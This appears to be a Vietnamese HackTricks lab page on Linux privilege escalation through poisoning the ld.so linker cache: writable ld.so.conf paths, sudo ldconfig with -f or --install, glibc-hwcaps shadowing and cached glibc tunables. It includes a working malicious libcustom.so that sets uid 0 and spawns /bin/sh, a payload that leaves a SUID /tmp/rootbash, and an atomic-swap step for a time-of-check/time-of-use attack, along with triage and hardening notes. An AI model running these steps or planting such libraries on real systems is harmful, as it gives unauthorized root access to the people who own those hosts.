# Ví dụ exploit privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Trang này là lab tập trung vào việc đầu độc **system linker cache thông qua `/etc/ld.so.conf` hoặc `ldconfig`**. Để tìm hiểu về việc chèn thư viện bị thiếu, `RPATH`/`RUNPATH` có quyền ghi, `LD_PRELOAD` và các kiểu lạm dụng linker SUID phổ biến khác, xem [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Chuẩn bị môi trường

Trong phần sau, bạn có thể tìm thấy mã của các file sẽ dùng để chuẩn bị môi trường

{{#tabs}}
{{#tab name="sharedvuln.c"}}

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```

{{#endtab}}

{{#tab name="libcustom.h"}}

```c
#include <stdio.h>

void vuln_func();
```

{{#endtab}}

{{#tab name="libcustom.c"}}

```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```

{{#endtab}}
{{#endtabs}}

1. **Tạo** các file đó trên máy của bạn trong cùng thư mục
2. **Biên dịch** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Sao chép** `libcustom.so` vào `/usr/lib` và làm mới cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (cần quyền root)
4. **Biên dịch** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kiểm tra môi trường

Kiểm tra xem _libcustom.so_ có được **nạp** từ _/usr/lib_ hay không và bạn có thể **thực thi** binary hay không.

```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

### Các lệnh triage hữu ích

Khi tấn công một mục tiêu thực tế, hãy xác minh **tên thư viện chính xác** mà binary cần, loader **hiện đang phân giải** thư viện nào và những đường dẫn đã cấu hình nào có thể ghi được mà không làm thay đổi cache đang hoạt động.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```

Chỉ dùng `ldd` trên một executable **đáng tin cậy**. Một số cách triển khai hoặc ELF interpreter bất thường có thể khiến nó thực thi code do attacker kiểm soát; `objdump -p ./file | grep NEEDED` liệt kê an toàn các dependency trực tiếp. Với target đáng tin cậy, gọi interpreter đã tìm được cùng tùy chọn `--list` sẽ hiển thị cách phân giải thực tế. So sánh kết quả đó với `--inhibit-cache --list`: nếu khác nhau, điều đó chứng minh `/etc/ld.so.cache`, chứ không phải quy tắc search path thông thường, đã chọn object.<sup>[[1]](#references)[[4]](#references)</sup>

Một vài điểm dễ nhầm cần lưu ý:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` thường **không hoạt động** vì shell hiện tại của bạn thực hiện chuyển hướng. Thay vào đó, hãy dùng
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Các binary **SUID/đặc quyền** chạy ở **secure-execution mode**: `LD_LIBRARY_PATH`
  bị bỏ qua, còn `LD_PRELOAD` bị giới hạn (các tên có dấu gạch chéo bị bỏ qua, và chỉ các library có bit setuid trong thư mục chuẩn mới có thể được preload). Khi root chạy `ldconfig`, các thư mục được liệt kê trong
  `/etc/ld.so.conf` có thể được thêm vào `/etc/ld.so.cache`, vì vậy cấu hình sai này vẫn có thể ảnh hưởng đến các chương trình đặc quyền.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` cũng bị bỏ qua trong secure-execution mode, trừ khi `/etc/suid-debug` tồn tại. Vì vậy, hãy thu thập trace từ một lần chạy không phải SUID tương đương, thay vì chờ kết quả từ lần thực thi có đặc quyền.<sup>[[1]](#references)</sup>
- Trên glibc 2.33 trở lên, dynamic loader cũng cung cấp `--list-diagnostics`, tùy chọn này in ra các chẩn đoán của loader ở định dạng có thể đọc bằng máy và thông tin search path tích hợp sẵn khi hijack không hoạt động như dự kiến.<sup>[[1]](#references)[[6]](#references)</sup>

### Ràng buộc về cache và SONAME

`ldconfig` không cache mọi file tùy ý trong một thư mục được cấu hình: nó kiểm tra ELF header, nhận diện các tên khớp với `lib*.so*` hoặc `ld-*.so*`, và yêu cầu chuỗi tên theo quy ước `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Vì vậy, object được chèn phải có đúng architecture/class của target, tên `DT_NEEDED` chính xác (thường là `DT_SONAME` của nó), cùng mọi symbol/version mà victim phân giải.<sup>[[2]](#references)</sup>

```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```

Ưu tiên một thư viện dành riêng cho mục tiêu, chẳng hạn như ví dụ này. Việc shadow một SONAME phổ biến bằng một object không đầy đủ có thể làm hỏng mọi tiến trình phân giải SONAME đó trước khi mục tiêu đặc quyền dự kiến chạy.<sup>[[3]](#references)</sup>

### Duy trì đường dẫn trong cache và hoán đổi nguyên tử

Cache ghi lại ánh xạ **tên thư viện sang đường dẫn**; nó không nhúng shared object vào đó. Sau khi một đường dẫn do kẻ tấn công kiểm soát được lưu vào cache, việc thay object tại đúng đường dẫn đó sẽ ảnh hưởng đến các tiến trình mới khởi chạy mà không cần chạy lại `ldconfig`. Điều này cho phép áp dụng một mô hình time-of-check/time-of-use hữu ích: cung cấp một thư viện hợp lệ trong lúc quản trị viên xây dựng lại hoặc kiểm tra cache, rồi dùng thao tác đổi tên nguyên tử để thay nó bằng payload. Các tiến trình đang chạy vẫn giữ object đã được ánh xạ vào bộ nhớ.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```

Tương tự, xóa dòng độc hại khỏi `ld.so.conf` không tự loại bỏ mục đã được ghi trước đó: quản trị viên phải xóa đối tượng không đáng tin cậy, sửa quyền sở hữu/quyền ghi và xây dựng lại cache. Dùng phép so sánh `--inhibit-cache` ở trên để phân biệt mục cache cũ với đường dẫn cấu hình vẫn còn hoạt động.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Trong tình huống này, giả sử quản trị viên đã thêm một mục dễ bị tấn công vào một tệp trong `/etc/ld.so.conf.d/` được `/etc/ld.so.conf` của hệ thống đưa vào.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```

Thư mục dễ bị tấn công là _/home/ubuntu/lib_ (nơi chúng ta có quyền ghi).\
**Tải xuống và biên dịch** đoạn mã sau bên trong đường dẫn đó:

```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
    setgid(0);
    setuid(0);
    puts("I'm the bad library");
    system("/bin/sh");
}
```

Nếu dự đoán **root** (hoặc một tài khoản có đặc quyền khác) sẽ thực thi binary dễ bị tấn công sau này, thường nên để lại một **artifact do root sở hữu** thay vì khởi chạy shell tương tác. Ví dụ:

```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```

Sau khi quá trình thực thi với đặc quyền diễn ra, bạn có thể dùng `/tmp/rootbash -p`.

Giờ đây, chúng ta đã **tạo thư viện libcustom độc hại bên trong đường dẫn cấu hình sai**, cache mặc định phải được xây dựng lại bằng một lần chạy **`ldconfig`** với đặc quyền thành công. Khởi động lại chỉ có tác dụng khi quy trình khởi động cục bộ thực sự gọi lệnh này; nếu không, hãy đợi quản trị viên thực hiện thao tác đó hoặc dùng quy tắc sudo không an toàn nếu có.<sup>[[2]](#references)</sup>

Sau khi việc này diễn ra, hãy **kiểm tra lại** vị trí mà executable `sharedvuln` đang tải thư viện `libcustom.so` từ:

```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

Như bạn có thể thấy, nó đang **tải thư viện từ `/home/ubuntu/lib`** và nếu bất kỳ người dùng nào thực thi nó, một shell sẽ được thực thi:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

> [!TIP]
> Lưu ý rằng trong ví dụ này, chúng ta chưa nâng quyền, nhưng bằng cách sửa đổi các lệnh được thực thi và **chờ root hoặc người dùng có đặc quyền khác thực thi binary dễ bị tấn công**, chúng ta sẽ có thể nâng quyền.

### Che khuất bằng `glibc-hwcaps` hiện đại

Kể từ glibc 2.33, loader có thể ưu tiên các thư viện đã tối ưu nằm trong `glibc-hwcaps/<level>/` bên trong **mọi thư mục tìm kiếm thư viện**. Vì vậy, chỉ kiểm tra `/home/ubuntu/lib` là chưa đủ: một thư mục con tương thích có quyền ghi, chẳng hạn `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, có thể che khuất thư viện cơ sở sau khi `ldconfig` lập chỉ mục cho thư viện đó, trong khi các CPU khác vẫn sử dụng đối tượng cơ sở. Điều này cũng cho phép chiếm quyền có chọn lọc theo kiến trúc, vốn có thể bị bỏ sót khi việc xác thực được thực hiện trên một CPU khác.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
  -o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```

Hướng dẫn hardening glibc hiện khuyến nghị tránh các SONAME trùng lặp, các vị trí tìm kiếm không mặc định và các đối tượng trong thư mục con `glibc-hwcaps`. Khi audit, hãy kiểm tra đệ quy quyền sở hữu và quyền ghi đối với các thư mục được cấu hình cùng các thành phần đường dẫn cha của chúng.<sup>[[3]](#references)</sup>

### Các cấu hình sai khác - Cùng vuln

Trong ví dụ trước, chúng ta đã giả lập một cấu hình sai trong đó quản trị viên **đặt một thư mục không có đặc quyền bên trong một tệp cấu hình trong `/etc/ld.so.conf.d/`**.\
Nhưng cũng có những cấu hình sai khác có thể gây ra cùng lỗ hổng: nếu bạn có **quyền ghi** vào một **tệp cấu hình** được tải, có thể tạo tệp trong thư mục `/etc/ld.so.conf.d/` có thể ghi, hoặc có thể ghi vào `/etc/ld.so.conf`, thì bạn có thể cấu hình và khai thác cùng lỗ hổng này.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Giả sử bạn có đặc quyền sudo đối với `ldconfig`**. `ldconfig` chấp nhận các thư mục cần quét làm đối số vị trí, vì vậy cách thức cache-poisoning ngắn nhất thường chỉ đơn giản là:<sup>[[2]](#references)</sup>

```bash
sudo ldconfig /tmp
```

Ngoài ra, `-f` chọn một tệp cấu hình khác trong khi vẫn giữ đầu ra cache mặc định. Cách này hữu ích khi bộ lọc đối số chặn các thư mục vị trí nhưng vẫn cho phép `-f`, hoặc khi cần chèn nhiều đường dẫn:<sup>[[2]](#references)</sup>

```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Giờ đây, như đã đề cập trong **exploit trước đó**, hãy **tạo thư viện độc hại bên trong `/tmp`**.\
Và cuối cùng, hãy nạp đường dẫn rồi kiểm tra binary đang tải thư viện từ đâu:

```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**Như bạn có thể thấy, nếu có quyền sudo đối với `ldconfig`, bạn có thể khai thác cùng lỗ hổng này.** Chi tiết về các tùy chọn rất quan trọng khi đánh giá một quy tắc sudo bị giới hạn: `-f` chọn một tệp cấu hình khác nhưng vẫn dựng lại `/etc/ld.so.cache`; `-C` chuyển hướng cache sang nơi khác; `-N` ngăn việc dựng lại cache; còn `-X` ngăn cập nhật liên kết nhưng **vẫn dựng lại cache, trừ khi được dùng cùng `-N`**. `-n` ngầm bao gồm `-N`, nên tùy chọn này có thể cập nhật liên kết trong các thư mục được cung cấp nhưng không thể làm nhiễm độc cache; `-r` hoạt động bên dưới một root thay thế và thường không thay đổi cache của host.<sup>[[2]](#references)</sup>

### glibc 2.44: cài đặt cache dựng sẵn

Glibc 2.44 bổ sung `ldconfig --install SOURCE`, tùy chọn này sao chép nguyên tử một cache dựng sẵn đến đích cache đã chọn (mặc định là `/etc/ld.so.cache` của host, trừ khi `-C` hoặc `-r` thay đổi đích). Điều này tạo thêm một tham số nguy hiểm cho các quy tắc sudoers và wrapper có đặc quyền: kẻ tấn công có thể tạo một cache hợp lệ **mà không cần đặc quyền**, rồi dùng lệnh `--install` được cho phép để thay thế cache hệ thống. Đường dẫn cài đặt kiểm tra magic của cache nhưng không tạo lại các mục trong cache từ cấu hình đáng tin cậy.<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
  -C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```

Cache vẫn chứa **đường dẫn**, không phải byte của thư viện, vì vậy `/tmp/libcustom.so` phải còn tồn tại và tương thích khi chương trình mục tiêu khởi chạy. Trên glibc 2.44, các bộ lọc chỉ từ chối `-f`, thư mục dạng đối số vị trí hoặc `-t` là chưa đủ: hãy từ chối cả `--install`/`-I`, hoặc tốt nhất là không ủy quyền chạy `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: tunables toàn hệ thống được lưu trong cache

Kể từ glibc 2.44, `ldconfig` cũng phân tích `/etc/tunables.conf` và lưu các thiết lập của nó dưới dạng phần mở rộng trong `/etc/ld.so.cache`. Tệp này chấp nhận chỉ thị `include` và bộ lọc theo từng tiến trình. Các tiền tố kiểm soát phạm vi: `@`/`onlysecure` chỉ áp dụng cho tiến trình `AT_SECURE`, `$`/`nonsecure` loại trừ chúng, còn `*`/`anysecure` áp dụng cho cả hai. **Mục không có tiền tố mặc định áp dụng cho tiến trình không an toàn**, vì vậy kẻ tấn công phải dùng rõ ràng `@` hoặc `*` để tác động đến các chương trình setuid, setgid hoặc được nâng quyền bằng capability. Điều này mở rộng phạm vi kiểm tra vượt ra ngoài các thư mục thư viện: cấu hình tunables có thể ghi được hoặc tệp được include có thể tác động đến những lần khởi chạy chương trình sau này, sau khi cache được xây dựng lại với quyền đặc biệt.<sup>[[7]](#references)[[9]](#references)</sup>

Bản phát hành này cũng bổ sung `ldconfig -t TUNCONF`, cho phép chọn một tệp tunables thay thế trong khi vẫn ghi vào cache thông thường, trừ khi có tùy chọn khác thay đổi hành vi đó. Vì vậy, các wrapper và quy tắc sudo chỉ chặn `-f` cũng phải từ chối `-t`, thư mục vị trí tùy ý, `--install` và thao tác thay đổi đầu ra cache.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>

```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```

### Tunable chọn lọc mục tiêu

Bộ lọc `[proc:PATTERN]` chỉ áp dụng các mục sau khi đường dẫn `/proc/self/exe` đầy đủ của tệp thực thi (nếu `PATTERN` bắt đầu bằng `/`) hoặc tên cơ sở của tệp khớp. Bộ lọc kết thúc tại bộ lọc tiếp theo, `[]`, cuối tệp hoặc ranh giới của tệp include. Điều này giúp cache bị đầu độc ít gây chú ý hơn vì hành vi bị thay đổi có thể chỉ giới hạn ở một nạn nhân có đặc quyền.<sup>[[7]](#references)</sup>

```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```

Tiền tố `-`/`nonoverridable` ngăn `GLIBC_TUNABLES` ghi đè giá trị đã lưu trong cache; `+`/`overridable` khôi phục hành vi ghi đè thông thường. Dù sao, biến môi trường này hoàn toàn bị bỏ qua đối với các tiến trình `AT_SECURE`. Hãy xem định dạng tệp là phụ thuộc vào từng phiên bản—dự án glibc không cam kết đây là giao diện ổn định—và liệt kê các tên cùng giá trị được hỗ trợ bằng `"$interp" --list-tunables` trước khi thử tạo hiệu ứng nhắm mục tiêu.<sup>[[7]](#references)[[9]](#references)</sup>

Điều này không tự động dẫn đến thực thi mã tùy ý. Đây là một primitive **thao túng hành vi của loader** với đặc quyền: glibc cảnh báo rõ rằng các giá trị trên toàn hệ thống có thể áp dụng những tunable nhạy cảm về bảo mật cho chương trình setuid/setgid mà không qua bước sàng lọc bảo mật riêng cho từng tunable. Hãy tìm những thay đổi allocator cụ thể cho mục tiêu, thay đổi tăng cường bảo mật CPU hoặc tình trạng từ chối dịch vụ, thay vì mặc định rằng có một payload dùng được cho mọi trường hợp.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Tăng cường bảo mật Dynamic Linker - Thư viện GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (Tiện ích nhị phân GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Chẩn đoán Dynamic Linker (Thư viện GNU C)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables trên toàn hệ thống (Thư viện GNU C 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Thêm tunables trên toàn hệ thống: phần ldconfig (bản vá v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [Thư viện GNU C phiên bản 2.44 hiện đã có](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Mã nguồn ldconfig của glibc 2.44](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
